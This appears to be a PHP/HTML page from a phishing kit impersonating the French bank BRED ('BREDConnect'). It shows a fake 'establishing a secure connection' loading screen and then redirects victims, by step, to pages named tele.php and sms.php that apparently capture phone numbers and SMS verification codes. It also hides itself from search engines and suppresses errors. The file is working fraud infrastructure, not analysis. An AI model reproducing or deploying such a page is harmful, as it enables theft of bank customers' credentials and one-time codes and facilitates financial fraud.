<?php
error_reporting(0);
include("config.php");

if( isset($_GET["step"]) ) {
	
	if( $_GET["step"] == "1" ) {
		
		$delay = $delay1;
		$redir = "tele.php";
	}
	if( $_GET["step"] == "2" ) {
		
		$delay = $delay2;
		$redir = "sms.php?last=true";
	}
	if( $_GET["step"] == "3" ) {
		
		$delay = $delay2;
		$redir = "sms.php?inc=false&last=smscode";
	}

}


?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>BREDConnect</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<link type="image/gif" rel="icon" href="./img/favicon.gif">
<link type="image/gif" rel="shortcut icon" href="./img/favicon.gif">
<meta http-equiv="refresh" content="<?php echo $delay.'; URL='.$redir; ?>">
<meta name="robots" content="noindex, nofollow">
<meta name="generator" content="Web Page Maker">
<style type="text/css">
/*----------Text Styles----------*/
.ws6 {font-size: 8px;}
.ws7 {font-size: 9.3px;}
.ws8 {font-size: 11px;}
.ws9 {font-size: 12px;}
.ws10 {font-size: 13px;}
.ws11 {font-size: 15px;}
.ws12 {font-size: 16px;}
.ws14 {font-size: 19px;}
.ws16 {font-size: 21px;}
.ws18 {font-size: 24px;}
.ws20 {font-size: 27px;}
.ws22 {font-size: 29px;}
.ws24 {font-size: 32px;}
.ws26 {font-size: 35px;}
.ws28 {font-size: 37px;}
.ws36 {font-size: 48px;}
.ws48 {font-size: 64px;}
.ws72 {font-size: 96px;}
.wpmd {font-size: 13px;font-family: Arial,Helvetica,Sans-Serif;font-style: normal;font-weight: normal;}
/*----------Para Styles----------*/
DIV,UL,OL /* Left */
{
 margin-top: 0px;
 margin-bottom: 0px;
}
</style>

<style type="text/css">
div#container
{
	position:relative;
	width: 346px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image2" style="position:absolute; overflow:hidden; left:44px; top:417px; width:156px; height:25px; z-index:0"><img src="./img/ll1.png" alt="" title="" width="156" height="25" border="0"></div>

<div id="image3" style="position:absolute; overflow:hidden; left:210px; top:417px; width:16px; height:25px; z-index:1"><a href="" target="_blank"><img src="./img/ll2.png" alt="" title="" width="16" height="25" border="0"></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:232px; top:418px; width:27px; height:25px; z-index:2"><a href="" target="_blank"><img src="./img/ll3.png" alt="" title="" width="27" height="25" border="0"></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:266px; top:417px; width:27px; height:26px; z-index:3"><a href="" target="_blank"><img src="./img/ll4.png" alt="" title="" width="27" height="26" border="0"></a></div>
<div id="text1" style="position:absolute; overflow:hidden; left:0px; top:349px; width:346px; height:59px; z-index:4">
<div class="wpmd">
<div align="center"><font class="ws12" color="#969696"><b>Veuillez patienter svp le temps </b></font></div>
<div align="center"><font class="ws12" color="#969696"><b>d'&eacute;tablir une connexion s&eacute;curis&eacute;e...</b></font></div>
</div></div>
<br>

<div id="image6" style="position:absolute; overflow:hidden; left:2px; top:110px; width:341px; height:205px; z-index:5"><img src="./image/logo-bred.svg" alt="" title="" width="341" height="205" border="0"></div>

<div id="image1" style="position:absolute; overflow:hidden; left:144px; top:277px; width:54px; height:55px; z-index:6"><img src="./img/loadingx.gif" alt="" title="" width="54" height="55" border="0"></div>

</div>



</body>
</html>